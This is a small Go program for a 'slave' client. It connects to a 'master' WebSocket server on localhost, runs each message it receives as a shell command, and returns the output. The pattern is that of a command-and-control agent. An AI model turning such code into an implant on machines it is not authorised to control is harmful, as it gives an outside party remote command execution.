package main

import (
	"fmt"
	"log"
	"os/exec"
	"time"

	"github.com/gorilla/websocket"
)

// CLIENT

type client struct {
	connection *websocket.Conn
}

func (c *client) connectToServer(host string, port int) {
	masterURL := fmt.Sprintf("ws://%s:%d/ws", host, port)
	connection, _, err := websocket.DefaultDialer.Dial(masterURL, nil)
	if err != nil {
		msg := fmt.Errorf("Error opening connection %+v", err)
		fmt.Println(msg)
	} else {
		c.connection = connection
	}

}

func (c *client) runShellCommand(command []byte) []byte {
	stringCommand := string(command)
	log.Printf("Running %s command\n", stringCommand)
	output, err := exec.Command(stringCommand).Output()
	if err != nil {
		log.Printf("Error running command: %s\n", err)
	}
	fmt.Println(string(output))
	return output
	// Send the newly received message to the broadcast channel
}

func main() {
	currentSlave := client{}
	currentSlave.connectToServer("localhost", 8000)
	for {
		_, commandToRun, err := currentSlave.connection.ReadMessage()
		if err != nil {
			fmt.Printf("Error reading from master: %+v\n", err)
		} else {
			fmt.Println(string(commandToRun))
			commandOutput := currentSlave.runShellCommand(commandToRun)
			err = currentSlave.connection.WriteMessage(2, commandOutput)
			if err != nil {
				fmt.Printf("Could not write message %s to ws %s\n", string(commandOutput), err)
			}
		}

		time.Sleep(time.Second * 1)
	}
}
